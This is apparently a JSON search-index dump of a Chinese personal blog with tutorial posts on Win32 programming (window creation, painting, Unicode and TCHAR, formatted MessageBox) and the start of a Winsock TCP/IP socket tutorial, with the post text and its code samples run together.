ANSI_VAR_FONT：在Windows中为变间距（比例间距）系统字体； DEVICE_DEFAUCT_FONT：在WindowsNT中为设备相关字体； DEFAULT_GUI_FONT：用户界面对象缺省字体，如菜单和对话框； OEM_FIXED_FONT：原始设备制造商（OEM）相关固定间距（等宽）字体； SYSTEM_FONT：系统字体，在缺省情况下，系统使用系统字体绘制菜单，对话框控制和文本； SYSTEM_FIXED_FONT：固定间距（等宽）系统字体，该对象仅提供给兼容16位Windows版本； DEFAULT_PALETTE：缺省调色板，该调色板由系统调色板中的静态色彩组成。","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"windows向导及句柄","slug":"pwcp004-windows向导及句柄","date":"2021-05-31T02:11:55.000Z","updated":"2021-05-31T04:21:53.788Z","comments":true,"path":"2021/05/31/pwcp004-windows向导及句柄/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/31/pwcp004-windows向导及句柄/","excerpt":"","text":"windows向导及句柄 最好把stdafx.h中的#define WIN32_LEAN_AND_MEAN 注释掉,不然很多功能会使用不了 当水平或垂直方向发生变化时就重画 窗口在创建过程中触发的第一个消息 PlaySound 用于播放音乐的API函数 RECT矩形类 HDC设备上下文句柄 PAINTSTRUCT 包含了某应用程序用来绘制它所拥有的窗口客户区所需要的信息的结构体 BeginPaint 指定窗口进行绘图工作的准备，并用将和绘图有关的信息填充到一个PAINTSTRUCT结构中 EndPaint释放设备上下文句柄 GetClientRect获取窗口客户区大小 Ellipse在窗口客户区画一个椭圆 DrawText 在窗口打印文字 句柄 windows向导 最好把stdafx.h中的#define WIN32_LEAN_AND_MEAN 注释掉,不然很多功能会使用不了 1//#define WIN32_LEAN_AND_MEAN // 从 Windows 头中排除极少使用的资料 当水平或垂直方向发生变化时就重画 1wcex.style = CS_HREDRAW | CS_VREDRAW;//当水平或垂直方向发生变化时就重画 窗口在创建过程中触发的第一个消息 1case WM_CREATE: PlaySound 用于播放音乐的API函数 1BOOL PlaySound(LPCSTR pszSound, HMODULE hmod,DWORD fdwSound); 在vs2010以上版本需要加入#pragma comment(lib, “winmm.lib”)才能使用PlaySound 或在项目属性-&gt;链接器-&gt;输入-&gt;附加依赖项中添加winmm.lib SND_ASYNC 异步播放 SND_FILENAME 文件名 1PlaySound(TEXT(\"2.wav\"),NULL,SND_FILENAME | SND_ASYNC); RECT矩形类 123456typedef struct _RECT &#123;LONG left;LONG top;LONG right;LONG bottom;&#125; RECT, *PRECT; HDC设备上下文句柄 1HDC hdc; //设备上下文句柄 PAINTSTRUCT 包含了某应用程序用来绘制它所拥有的窗口客户区所需要的信息的结构体 12345678typedef struct tagPAINTSTRUCT &#123;HDC hdc;BOOL fErase;RECT rcPaint;BOOL fRestore;BOOL fIncUpdate;BYTE rgbReserved[32];&#125; PAINTSTRUCT, *PPAINTSTRUCT; 1PAINTSTRUCT ps; //绘制结构 BeginPaint 指定窗口进行绘图工作的准备，并用将和绘图有关的信息填充到一个PAINTSTRUCT结构中 1234HDC BeginPaint(HWND hwnd, // 窗口的句柄LPPAINTSTRUCT lpPaint // 绘制信息); 1hdc = BeginPaint(hwnd,&amp;ps); //获取设备上下文句柄 EndPaint释放设备上下文句柄 1234BOOL EndPaint(HWND hWnd, // 窗口句柄CONST PAINTSTRUCT *lpPaint // 绘制窗口的数据); 1EndPaint(hwnd,&amp;ps); //释放设备上下文句柄 &gt; GetClientRect获取窗口客户区大小 1234BOOL GetClientRect(HWND hWnd, // 窗口句柄LPRECT lpRect // 客户区坐标); 1GetClientRect(hwnd, &amp;rect); //获取窗口客户区大小 Ellipse在窗口客户区画一个椭圆 123456BOOL Ellipse(HDC hdc, //设备环境句柄。int nLeftRect, //指定限定矩形左上角的X坐标。int nTopRect, //指定限定矩形左上角的Y坐标。int nRightRect, //指定限定矩形右下角的X坐标。int nBottomRect //指定限定矩形右下角的Y坐标。); 1Ellipse(hdc, 0, 0, 200, 100); //在窗口客户区画一个椭圆 DrawText 在窗口打印文字 1234567int DrawText(HDC hDC, // 设备描述表句柄LPCTSTR lpString, // 将要绘制的字符串int nCount, // 字符串的长度LPRECT lpRect, // 指向矩形结构RECT的指针UINT uFormat // 正文的绘制选项); 123DrawText(hdc, TEXT(\"Hello Windows SDK\"), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER); DT_SINGLELINE 单行显示文本，回车和换行符都不断行。 DT_CENTER 指定文本水平居中显示。 DT_VCENTER 指定文本垂直居中显示。该标记只在单行文本输出时有效，所以它必须与DT_SINGLELINE结合使用。 句柄 HINSTANCE 实例化句柄 HWND 窗口句柄 HDC 设备上下文句柄 HICON 图标句柄 HCURSOR 鼠标句柄 HBRUSH 画刷句柄 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198// windows向导.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"windows向导.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_WINDOWS, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WINDOWS)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW;//当水平或垂直方向发生变化时就重画 wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WINDOWS)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); //wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_WINDOWS); wcex.lpszMenuName = NULL; wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; RECT rect; switch (message) &#123; //case WM_COMMAND: // &#123; // int wmId = LOWORD(wParam); // // 分析菜单选择: // switch (wmId) // &#123; // case IDM_ABOUT: // DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); // break; // case IDM_EXIT: // DestroyWindow(hWnd); // break; // default: // return DefWindowProc(hWnd, message, wParam, lParam); // &#125; // &#125; // break; case WM_CREATE: //窗口在创建过程中触发的第一个消息 //SND_ASYNC 异步播放 //SND_FILENAME 文件名 //需要在项目属性-&gt;链接器-&gt;输入-&gt;附加依赖项中添加winmm.lib //PlaySound(TEXT(\"2.wav\"),NULL,SND_FILENAME | SND_ASYNC); break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... GetClientRect(hWnd, &amp;rect); Ellipse(hdc,0,0,rect.right,rect.bottom); DrawText(hdc, TEXT(\"我爱你\"), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"Windows模型","slug":"pwcp003-Windows模型","date":"2021-05-30T12:06:53.000Z","updated":"2021-05-31T01:01:51.246Z","comments":true,"path":"2021/05/30/pwcp003-Windows模型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/30/pwcp003-Windows模型/","excerpt":"","text":"HWND H代表句柄,WND代表窗口 HINSTANCE 实例句柄,只要是一个已经存在的程序或窗口等,都称为实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include&lt;iostream&gt;#include&lt;windows.h&gt;using namespace std;//窗口回调函数LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow )&#123; HWND hwnd; //实例句柄 MSG msg; //消息 WNDCLASS wc; //窗口类 //1.设计一个窗口类 wc.style = 0; //窗口样式 wc.lpfnWndProc = (WNDPROC)WndProc; //窗口回调函数 wc.cbClsExtra = 0; //额外窗口类的内存 wc.cbWndExtra = 0; //额外窗口内存 wc.hInstance = hInstance; //窗口的实例句柄 wc.hIcon = LoadIcon(NULL,IDI_WINLOGO); //窗口图标 wc.hCursor = LoadCursor(NULL, IDC_ARROW); //箭头鼠标 wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); //窗口颜色 wc.lpszMenuName = NULL; //窗口菜单 wc.lpszClassName = TEXT(\"MyWndClass\"); //窗口类名 //2.注册窗口类 RegisterClass(&amp;wc); //3.创建窗口 hwnd = CreateWindow( TEXT(\"MyWndClass\"), //窗口类名 TEXT(\"窗口标题\"), //窗口标题 WS_OVERLAPPEDWINDOW, //窗口风格 CW_USEDEFAULT, //窗口X坐标位置 默认 CW_USEDEFAULT, //窗口Y坐标位置 默认 CW_USEDEFAULT, //宽度 默认 CW_USEDEFAULT, //高度 默认 NULL, //父窗口句柄 NULL, //菜单句柄 hInstance, //窗口实例句柄 NULL //用户数据 ); //4.显示和更新窗口 ShowWindow(hwnd, iCmdShow); UpdateWindow(hwnd); //5.消息循环 while (GetMessage(&amp;msg, NULL, 0, 0)) &#123; //把键盘输入翻译成为可传递的消息 TranslateMessage(&amp;msg); //转发消息到窗口过程函数 DispatchMessage(&amp;msg); &#125; //返回消息参数 return msg.wParam;&#125;LRESULT CALLBACK WndProc( HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam )&#123; //是一种包含了某应用程序用来绘制它所拥有的窗口客户区所需要的信息的结构体 PAINTSTRUCT ps; //绘制结构 HDC hdc; //设备上下文句柄 RECT rect; //矩形框 switch (message) &#123; case WM_SIZE: //窗口的大小发生改变时 return 0; case WM_LBUTTONDOWN: /* MessageBox(hwnd, TEXT(\"Hello Windows SDK\"), TEXT(\"Windows\"), MB_OK);*/ return 0; case WM_PAINT: //打印消息 hdc = BeginPaint(hwnd,&amp;ps); //获取设备上下文句柄 GetClientRect(hwnd, &amp;rect); //获取窗口客户区大小 Ellipse(hdc, 0, 0, 200, 100); //在窗口客户区画一个椭圆 //在指定的矩形里写入格式化的正文，根据指定的方法对正文格式化 //DrawText(hdc, 将要绘制的字符串,字符串的长度,指向矩形结构RECT的指针, 正文的绘制选项) //-1代表全部输出 DrawText(hdc, TEXT(\"Hello Windows SDK\"), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER ); EndPaint(hwnd,&amp;ps); //释放设备上下文句柄 return 0; case WM_DESTROY: //销毁窗口消息(关闭) PostQuitMessage(0); //将0放入消息队列中,让GetMessage获取,然后退出消息循环 return 0; &#125; //把不需要处理的消息交给操作系统处理 return DefWindowProc(hwnd,message,wParam,lParam);&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"Unicode简介","slug":"pwcp002-Unicode简介","date":"2021-05-30T06:38:31.000Z","updated":"2021-05-30T13:26:11.475Z","comments":true,"path":"2021/05/30/pwcp002-Unicode简介/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/30/pwcp002-Unicode简介/","excerpt":"","text":"Unicode简介 两种字符集 ASCII Unicode(宽字符) 两种字符类型 char wchar_t CHAR WCHAR 函数的两种版本 printf wprintf strlen wcslen MessageBoxA MessageBoxW PCHAR PWCHAR 通用版本 _tcslen MessageBox TCHAR PTCHAR 通用宏 TEXT _TEXT __T _T 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include&lt;stdio.h&gt;#include&lt;wchar.h&gt;#include&lt;windows.h&gt;#include&lt;locale.h&gt;//ASCII 版本 多字节字符集 双字节字符集void test1() &#123; char a = 'A'; char str[] = \"我爱你\"; CHAR a2 = 'A'; printf(\"%c\\n\", a); printf(\"%s\\n\", str); printf(\"%d\\n\", strlen(str)); MessageBoxA(NULL, str, NULL, MB_OK);&#125;//Unicode 版本void test2() &#123; setlocale(LC_ALL, \"chs\"); wchar_t a = L'A'; wchar_t str[] = L\"我爱你\"; WCHAR a2 = L'A'; wprintf(L\"%lc\\n\", a); wprintf(L\"%ls\\n\", str); wprintf(L\"%d\\n\", wcslen(str)); //这里显示3个字符,是因为把两个字节当一个字符处理 MessageBoxW(NULL, str, NULL, MB_OK);&#125;//通用版本,一般使用这个void test3()&#123; setlocale(LC_ALL, \"chs\"); TCHAR a = TEXT('A'); TCHAR str[] = TEXT(\"我爱你\"); TCHAR a2 = TEXT('A'); MessageBox(NULL, str, NULL, MB_OK);&#125;int main(int argc,char * argv[]) &#123; test1(); test2(); test3(); return 0;&#125; Windows中使用sprintf ASCII版本 宽字符版本 通用版本 可变数目的参数 标准版 sprintf swprintf _stprintf 最大长度版 _snprintf _snwprintf _sntprintf windows版 wsprintfA wsprintfW wsprintf ----------------------- --------- --------- --------- 参数数组的指针 标准版 vsprintf vswprintf vstprintf 最大长度版 _vsnprintf _vsnwprintf _vsntprintf windows版 wvsprintfA wvsprintfW wvsprintf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;tchar.h&gt;#include&lt;stdarg.h&gt;//自定义ASCII格式化MessageBox函数int CDECL MessageBoxPrintfA(char *szCaption, char *szFormat, ...);//自定义Unicode格式化MessageBox函数int CDECL MessageBoxPrintfW(wchar_t *szCaption, wchar_t *szFormat, ...);//自定义通用格式化MessageBox函数int CDECL MessageBoxPrintf(TCHAR *szCaption, TCHAR *szFormat, ...);//ASCII 版本void test1() &#123; int a = 12; char szBuffer[100] = &#123; 0 &#125;; //不安全版本 sprintf(szBuffer, \"我爱你%d\", a); MessageBoxA(NULL,szBuffer,\"ASCII 不安全版本\",MB_OK); //安全版本 _snprintf(szBuffer, 100,\"我爱你%d\", a); MessageBoxA(NULL, szBuffer, \"ASCII 安全版本\", MB_OK);&#125;//Unicode 版本void test2() &#123; int a = 12; wchar_t szBuffer[100] = &#123; 0 &#125;; swprintf(szBuffer,100, L\"我爱你%d\", a); MessageBoxW(NULL, szBuffer, L\"Unicode 版本\", MB_OK); //安全版本 _snwprintf(szBuffer,100,L\"我爱你%d\", a); MessageBoxW(NULL, szBuffer, L\"Unicode 版本\", MB_OK);&#125;//通用版本void test3() &#123; int a = 12; TCHAR szBuffer[100] = &#123; 0 &#125;; //通用不安全版本 _stprintf(szBuffer, TEXT(\"我爱你%d\"), a); MessageBox(NULL, szBuffer, TEXT(\"通用不安全版本\"), MB_OK); //通用安全版本 _sntprintf(szBuffer, 100, TEXT(\"我爱你%d\"), a); return MessageBox(NULL, szBuffer, TEXT(\"通用安全版本\"), MB_OK);&#125;void test4() &#123; MessageBoxPrintf(TEXT(\"MessageBoxPrintf 标题\"), TEXT(\"我爱你%d%d\"), 13, 14);&#125;void test5() &#123; MessageBoxPrintfA(\"MessageBoxPrintf 标题\", \"我爱你%d%d\", 13, 14);&#125;void test6() &#123; MessageBoxPrintfW(L\"MessageBoxPrintf 标题\", L\"我爱你%d%d\", 13, 14);&#125;int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)&#123; //test1(); //ASCII //test2(); //Unicode //test3(); //通用版本 //test4(); //通用版本格式化MessageBox test5(); //ASCII本格式化MessageBox test6(); //Unicode本格式化MessageBox&#125;//自定义通用格式化MessageBox函数int CDECL MessageBoxPrintf(TCHAR *szCaption, TCHAR *szFormat, ...) &#123; va_list pArgs; //用来接收...参数 TCHAR szBuffer[1024]; //获取...第一个参数的地址 va_start(pArgs, szFormat); //通用版本_vsntprintf根据平台来决定是ASCII还是Unicode //_vsntprintf(通用缓冲区,缓冲区大小,格式字符串,可变参数变量) //将szFormat,pArgs的内容放到szBuffer中,并将szFormat中的%xxx,对应替换成pArgs _vsntprintf(szBuffer, sizeof(szBuffer) / sizeof(TCHAR), szFormat, pArgs); //结束对pArgs变量的使用 va_end(pArgs); return MessageBox(NULL, szBuffer, szCaption, MB_OK);&#125;//自定义ASCII格式化MessageBox函数int CDECL MessageBoxPrintfA(char *szCaption, char *szFormat, ...) &#123; va_list pArgs; //用来接收...参数 char szBuffer[1024]; //获取...第一个参数的地址 va_start(pArgs, szFormat); //ASCII版本_vsnprintf //_vsntprintf(ASCII缓冲区,缓冲区大小,格式字符串,可变参数变量) //将szFormat,pArgs的内容放到szBuffer中,并将szFormat中的%xxx,对应替换成pArgs _vsnprintf(szBuffer, sizeof(szBuffer) / sizeof(char), szFormat, pArgs); //结束对pArgs变量的使用 va_end(pArgs); return MessageBoxA(NULL, szBuffer, szCaption, MB_OK);&#125;//自定义Unicode格式化MessageBox函数int CDECL MessageBoxPrintfW(wchar_t *szCaption, wchar_t *szFormat, ...) &#123; va_list pArgs; //用来接收...参数 wchar_t szBuffer[1024]; //获取...第一个参数的地址 va_start(pArgs, szFormat); //Unicode版本_vsnwprintf //_vsntprintf(Unicode缓冲区,缓冲区大小,格式字符串,可变参数变量) //将szFormat,pArgs的内容放到szBuffer中,并将szFormat中的%xxx,对应替换成pArgs _vsnwprintf(szBuffer, sizeof(szBuffer) / sizeof(wchar_t), szFormat, pArgs); //结束对pArgs变量的使用 va_end(pArgs); return MessageBoxW(NULL, szBuffer, szCaption, MB_OK);&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"第一个Windows程序","slug":"pwcp001-第一个Windows程序","date":"2021-05-30T06:34:55.000Z","updated":"2021-05-30T06:37:38.863Z","comments":true,"path":"2021/05/30/pwcp001-第一个Windows程序/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/30/pwcp001-第一个Windows程序/","excerpt":"","text":"第一个Windows程序 123456789101112131415161718192021222324252627282930313233#include&lt;iostream&gt;#include&lt;windows.h&gt;using namespace std;//int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR szCmdLine,int iCmdShow)/*WINAPI 是____stdcallWinMain 是入口函数HINSTANCE实例句柄类型HINSTANCE hInstance 本模块的实例句柄HINSTANCE hPrevInstance 是旧时代的,Win16留下来的,PSTR szCmdLine 命令行参数int iCmdShow 主窗口初始化时显示方式*/int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR szCmdLine,int iCmdShow)&#123; MessageBox(NULL,TEXT(\"我爱你,小麦老婆\"),TEXT(\"这是标题\"),MB_OK); return 0;&#125;/*MessageBox(NULL,TEXT(\"我爱你,小麦老婆\"),TEXT(\"这是标题\"),MB_OK);MessageBox 对话框函数参数1: 窗口句柄参数2:对话框内容参数3:标题参数4:标志 显示消息框中的按钮以及图标。*/ WINAPI 是__stdcall WinMain 是入口函数 HINSTANCE实例句柄类型 HINSTANCE hInstance 本模块的实例句柄 HINSTANCE hPrevInstance 是旧时代的,Win16留下来的, PSTR szCmdLine 命令行参数 int iCmdShow 主窗口初始化时显示方式 MessageBox(NULL,TEXT(“我爱你,小麦老婆”),TEXT(“这是标题”),MB_OK); MessageBox 对话框函数 参数1: 窗口句柄 参数2:对话框内容 参数3:标题 参数4:标志 显示消息框中的按钮以及图标。","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"TCP/IP协议","slug":"WS001CS模型的TCP_IP协议","date":"2021-05-28T01:31:12.000Z","updated":"2021-06-08T14:49:38.916Z","comments":true,"path":"2021/05/28/WS001CS模型的TCP_IP协议/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/28/WS001CS模型的TCP_IP协议/","excerpt":"","text":"TCP/IP协议 基于tcp/ip协议的c/s模型 tcp/ip协议 Transmission Control Protocol / Internet Protocol 重要性 TCP/IP是今天的互联网的基石，没有这个就上不了网了 概念 tcp/ip协议族(簇，组，体系），并不是tcp协议和ip协议的总称，tcp/ip指的是整个网络传输体系。而tcp协议和ip协议就是单单的两个协议。 tcp/ip协议的特点 面向连接的，可靠的，基于字节流的传输层协议。 udp/ip 面向非连接的，不可靠的，基于数据报的传输层协议。 client/server ----- 客户端/服务器模型 比如QQ，DNF，LOL等这些我们下载客户端的，都属于c/s模型的一个应用 c/s模型其实是概念层面的，实现层面可以是基于任何的网络协议。 常见的还有b/s模型 浏览器/服务器模型 基于http/https协议的 套接字编程与socket编程 socket中文-&gt;套接字，也统称叫网络编程 演示我们要实现的效果 局域网 如果在广域网使用啊 内网穿透，内网转发 花生壳 Sunny-Ngrok … 服务端 网络头文件 网络库 最底层的网络函数，大家用QT MFC wpf，或者百度下载的很多其他的封装好的网络库，都是对咱们讲的这些最本质的网络函数的二次封装，咱们讲的是通用的，讲完这个大家也可以自己封装函数库给别人用了。 #include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 函数库 winsock2.h windows socket 第2版 第一版是 winsock.h 查看具体区别 目前网络库有哪些版本？ 1.0 1.1 2.0 2.1 2.2 演示MSDN 查这个函数的详细信息 WSAStartup 我们的开发环境支持哪个版本？ 打开头文件，看咱们当前编译器环境支持的最高版本 ws2_32.lib windows socket 第2版 32位 不管是64编译环境还是32编译环境，都是用这个，并没有ws2_64.dll wsock32.lib winsock.h 第一版网络库 对应的库文件 这里不区分大小写 打开网络库 1234int WSAStartup(WORD wVersionRequired,LPWSADATA lpWSAData); 功能 打开网络库/启动网络库，启动了这个库，这个库里的函数/功能才能使用 w windows s socket a Asynchronous 异步 startup 启动 同步与异步 同步 阻塞/卡死状态 异步 多个工作同时进行 参数1 我们要使用的库的版本 类型是 WORD 转定义：unsigned short WORD wVersionRequired = MAKEWORD(2,2); MAKEWORD(主版本,副版本)， 1.0 2.2 wVersionRequired 数据高位/高地址是副版本 数据低位/低地址是主版本 用调试+计算器演示数据原理 位运算，内存操作，小端存储 参数2 LPWSADATA lpWSAData 系统通过这个参数给我们一些配置信息 注意 当看到参数有 LP P前缀的时候，是说我们这里要传对应类型变量的地址，这是win32API 的规范 或者叫规则 看下有哪些信息 123456789struct WSAData &#123;WORD wVersion;WORD wHighVersion;unsigned short iMaxSockets;unsigned short iMaxUdpDg;char *lpVendorInfo;char szDescription[WSADESCRIPTION_LEN + 1];char szSystemStatus[WSASYS_STATUS_LEN + 1];&#125; wVersion 我们要使用的版本 wHighVersion 系统能提供给我们最高的版本 iMaxSockets 返回可用的socket的数量，2版本之后就没用了 iMaxUdpDg UDP数据报信息的大小，2版本之后就没用了 lpVendorInfo 供应商特定的信息，2版本之后就没用了 szDescription szSystemStatus 当前库的描述信息，2.0是第二版的意思 当输入的版本不存在 输入1.3， 2.3 有主版本，没有副版本 得到该主版本的最大副版本 1.1 2.2并使用 输入3.1 3.3 超过最大版本号 使用系统能提供的最大的版本 2.2 输入 0.0 0.1 0.3 主版本是0 网络库打开失败，不支持请求的套接字版本 返回值 返回0为执行正确 失败 这些宏的本质 WSASYSNOTREADY 10091 底层网络子系统尚未准备好进行网络通信。 系统配置问题，重启下电脑，检查ws2_32库是否存在，或者是否在环境配置目录下 WSAVERNOTSUPPORTED 10092 此特定Windows套接字实现不提供所请求的Windows套接字支持的版本。 要使用的版本不支持 WSAEPROCLIM 10067 已达到对Windows套接字实现支持的任务数量的限制。 Windows Sockets实现可能限制同时使用它的应用程序的数量 WSAEINPROGRESS 10036 正在阻止Windows Sockets 1.1操作。 当前函数运行期间，由于某些原因造成阻塞，会返回在这个错误码，其他操作均禁止 WSAEFAULT 10014 lpWSAData参数不是有效指针。 参数写错了 校验版本 2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion) HIBYTE是高位 副版本 LOBYTE是地位 主版本 逻辑 只要有一个不是2，说明系统不支持我们要的2.2版本 关闭库 并结束函数，可以给出相应提示 WSACleanup(); return 0； 创建SOCKET SOCKET socket( int af, int type, int protocol ); 作用 创建一个SOCKET SOCKET介绍 什么是socket 将底层复杂的协议体系，执行流程，进行了封装，封装完的结果，就是一个SOCKET了， 也就是说，SOCKET是我们调用协议进行通信的 操作接口 意义 将复杂的协议过程与我们编程人员分开，我们直接操作一个简单SOCKET就行了，对于底层的协议 过程细节，完全不用知道，这就大大方便了我们。 网络编程难就难在协议本身的复杂性，简单就简单在我们编程层面完全不用考虑哪些 本质 就是一种数据类型，转定义看下类型 就是一个整数 uint 但是这个数是唯一的 标识着我当前的应用程序，协议特点等信息 ID，门牌号 应用 我们网络通信的函数，全部都要使用SOCKET 演示 逻辑 每个客户端有一个SOCKET，服务器有一个SOCKET，通信时候，就需要这个SOCKET做参数，给谁通信，就要传递谁的SOCKET 所以 网络编程，理论层面SOCKET是网络封装的精华，代码层面就是不停的使用SOCKET这个变量，所以又叫SOCKET编程 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 